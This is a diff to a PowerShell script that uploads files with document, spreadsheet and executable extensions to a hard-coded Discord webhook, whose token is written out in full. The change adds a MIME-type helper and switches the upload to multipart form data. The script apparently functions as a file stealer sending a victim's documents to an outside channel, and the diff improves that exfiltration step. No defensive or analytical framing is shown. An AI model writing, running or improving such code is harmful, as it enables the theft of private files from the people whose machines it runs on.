@@ -1,6 +1,23 @@
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
 $FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")
 
+function Get-MimeType {
+    param (
+        [string]$FilePath
+    )
+
+    switch ([System.IO.Path]::GetExtension($FilePath).ToLower()) {
+        ".txt"  { return "text/plain" }
+        ".pdf"  { return "application/pdf" }
+        ".csv"  { return "text/csv" }
+        ".doc"  { return "application/msword" }
+        ".docx" { return "application/vnd.openxmlformats-officedocument.wordprocessingml.document" }
+        ".xlsx" { return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }
+        ".exe"  { return "application/octet-stream" }
+        default { return "application/octet-stream" }
+    }
+}
+
 function Send-FileToDiscord {
     param (
         [string]$FilePath
@@ -8,11 +25,14 @@ function Send-FileToDiscord {
 
     try {
         $FileName = Split-Path -Leaf $FilePath
-        $FileContent = [System.IO.File]::ReadAllBytes($FilePath)
-        $ContentType = [System.Web.MimeMapping]::GetMimeMapping($FilePath)
+        $ContentType = Get-MimeType -FilePath $FilePath
 
-        # Build request body with the file
-        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -InFile $FilePath -ContentType $ContentType
+        # Build multipart form-data for the file upload
+        $Body = @{
+            file = Get-Content -Path $FilePath -AsByteStream
+        }
+
+        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Form $Body
         Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
     } catch {
         Write-Host "Failed to send $FilePath to Discord: $_" -ForegroundColor Red
